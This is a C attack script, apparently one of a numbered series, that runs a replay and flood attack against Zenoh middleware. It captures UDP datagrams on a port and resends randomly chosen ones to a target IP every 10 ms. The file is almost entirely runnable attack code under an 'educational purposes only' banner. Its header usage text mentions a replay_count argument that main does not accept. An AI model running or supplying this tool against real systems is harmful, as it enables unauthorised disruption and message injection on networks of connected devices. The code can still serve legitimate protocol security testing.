/*
 * Attack 6: Replay Attack
 * Captures and replays legitimate messages
 * 
 * Compile: gcc -o attack6_replay attack_6_replay.c -pthread
 * Run: sudo ./attack6_replay <target_ip> <target_port> <replay_count>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>

#define MAX_CAPTURED 1000
#define MAX_PACKET_SIZE 4096

static volatile int g_running = 1;

typedef struct {
    unsigned char data[MAX_PACKET_SIZE];
    size_t len;
    time_t captured_at;
} captured_packet_t;

typedef struct {
    char *target_ip;
    int target_port;
    captured_packet_t packets[MAX_CAPTURED];
    int packet_count;
    pthread_mutex_t mutex;
} replay_ctx_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping replay attack...\n");
    g_running = 0;
}

void* capture_thread(void *arg) {
    replay_ctx_t *ctx = (replay_ctx_t*)arg;
    int sock;
    unsigned char buffer[MAX_PACKET_SIZE];
    struct sockaddr_in src_addr;
    socklen_t addr_len = sizeof(src_addr);
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Capture socket failed");
        return NULL;
    }
    
    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(ctx->target_port);
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    if (bind(sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("[-] Bind failed (need root?)");
        close(sock);
        return NULL;
    }
    
    printf("[+] Packet capture started on port %d\n", ctx->target_port);
    
    while (g_running) {
        ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0,
                              (struct sockaddr*)&src_addr, &addr_len);
        
        if (len <= 0) continue;
        
        pthread_mutex_lock(&ctx->mutex);
        
        if (ctx->packet_count < MAX_CAPTURED) {
            captured_packet_t *pkt = &ctx->packets[ctx->packet_count++];
            memcpy(pkt->data, buffer, len);
            pkt->len = len;
            pkt->captured_at = time(NULL);
            
            printf("[+] Captured packet %d (%zd bytes, type=0x%02x)\n",
                   ctx->packet_count, len, buffer[0] & 0x1F);
        }
        
        pthread_mutex_unlock(&ctx->mutex);
    }
    
    close(sock);
    printf("[*] Capture stopped (%d packets captured)\n", ctx->packet_count);
    return NULL;
}

void* replay_thread(void *arg) {
    replay_ctx_t *ctx = (replay_ctx_t*)arg;
    int sock;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Replay socket failed");
        return NULL;
    }
    
    struct sockaddr_in target_addr = {0};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(ctx->target_port);
    inet_pton(AF_INET, ctx->target_ip, &target_addr.sin_addr);
    
    printf("[+] Replay engine started\n");
    
    sleep(10); // Wait for some packets
    
    unsigned long replay_count = 0;
    
    while (g_running) {
        pthread_mutex_lock(&ctx->mutex);
        
        if (ctx->packet_count > 0) {
            int idx = rand() % ctx->packet_count;
            captured_packet_t *pkt = &ctx->packets[idx];
            
            sendto(sock, pkt->data, pkt->len, 0,
                  (struct sockaddr*)&target_addr, sizeof(target_addr));
            
            replay_count++;
            
            if (replay_count % 100 == 0) {
                printf("[!] Replayed %lu packets\n", replay_count);
            }
        }
        
        pthread_mutex_unlock(&ctx->mutex);
        
        usleep(10000); // 10ms delay
    }
    
    close(sock);
    printf("[*] Replay stopped (%lu total replays)\n", replay_count);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: sudo %s <target_ip> <target_port>\n", argv[0]);
        return 1;
    }
    
    if (geteuid() != 0) {
        fprintf(stderr, "[-] This attack requires root privileges\n");
        return 1;
    }
    
    replay_ctx_t ctx = {0};
    ctx.target_ip = argv[1];
    ctx.target_port = atoi(argv[2]);
    pthread_mutex_init(&ctx.mutex, NULL);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Replay Attack                      ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", ctx.target_ip, ctx.target_port);
    printf("[*] Mode: Capture + Replay\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t capturer, replayer;
    pthread_create(&capturer, NULL, capture_thread, &ctx);
    pthread_create(&replayer, NULL, replay_thread, &ctx);
    
    pthread_join(capturer, NULL);
    pthread_join(replayer, NULL);
    
    pthread_mutex_destroy(&ctx.mutex);
    
    printf("\n[*] Attack stopped\n");
    return 0;
}